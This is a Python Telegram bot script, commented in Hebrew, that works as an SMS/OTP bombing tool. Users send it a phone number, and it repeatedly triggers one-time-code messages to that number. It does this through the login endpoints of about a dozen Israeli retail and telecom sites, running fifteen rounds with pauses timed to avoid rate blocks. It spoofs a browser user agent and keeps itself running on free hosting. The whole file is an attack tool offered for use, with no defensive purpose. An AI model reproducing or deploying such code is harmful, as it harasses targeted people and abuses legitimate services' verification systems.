import telebot
import requests
import time
from flask import Flask
from threading import Thread

# שרת דמה לשמירה על הבוט בחינם ב-Render
app = Flask('')
@app.route('/')
def home():
    return "Bot is running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- שים פה את ה-API TOKEN שלך מ-BotFather ---
API_TOKEN = '7611598236:AAFl9uS5i69F6Y5-W4e63eW4e63eW4e63e'
bot = telebot.TeleBot(API_TOKEN)

def attack(target):
    # רשימה מורחבת של אתרים לשליחת OTP
    apis = [
        {"u": "https://www.shufersal.co.il/online/he/login/otp/send", "d": {"phone": target}},
        {"u": "https://www.rebar.co.il/api/v1/auth/login", "d": {"phone": target}},
        {"u": "https://www.paz.co.il/api/v1/auth/otp", "d": {"phone": target}},
        {"u": "https://www.bezeq.co.il/api/v1/otp", "d": {"mobile": target}},
        {"u": "https://www.golbary.co.il/api/otp", "d": {"mobile": target}},
        {"u": "https://www.super-pharm.co.il/api/v1/auth/otp", "d": {"phone": target}},
        {"u": "https://www.castro.com/api/v1/auth/otp", "d": {"phone": target}},
        {"u": "https://www.ivory.co.il/api/v1/auth/otp", "d": {"phone": target}},
        {"u": "https://www.ksp.co.il/api/v1/auth/otp", "d": {"phone": target}},
        {"u": "https://www.yellow.co.il/api/v1/auth/otp", "d": {"phone": target}},
        {"u": "https://www.strauss-group.co.il/api/otp", "d": {"phone": target}},
        {"u": "https://www.rami-levy.co.il/api/v1/auth/otp", "d": {"phone": target}}
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json"
    }
    
    for site in apis:
        try:
            # שליחת הבקשה
            requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
            print(f"Sent to {site['u']}")
        except Exception as e:
            print(f"Error sending to {site['u']}: {e}")

@bot.message_handler(commands=['start'])
def welcome(m):
    bot.reply_to(m, "🔥 בוט ההפצצות מוכן! שלח לי מספר טלפון (10 ספרות) כדי להתחיל.")

@bot.message_handler(func=lambda m: True)
def handle(m):
    target = m.text.strip().replace("-", "") # מנקה מקפים אם המשתמש שם
    
    if target.isdigit() and len(target) == 10:
        bot.reply_to(m, f"🚀 מתחיל הפצצה מאסיבית על {target}...\nזה ייקח כמה רגעים.")
        
        # מריץ 15 סבבים של הפצצה
        for i in range(15):
            attack(target)
            time.sleep(0.5) # הפסקה קצרה כדי לא להיחסם מהר מדי
            
        bot.send_message(m.chat.id, f"✅ ההפצצה על {target} הושלמה בהצלחה!")
    else:
        bot.reply_to(m, "❌ שלח לי מספר טלפון תקין בלבד (למשל: 0521234567)")

if __name__ == "__main__":
    keep_alive() # מפעיל את השרת שמונע מ-Render לקרוס
    print("--- הבוט עלה לאוויר ---")
    bot.infinity_polling()
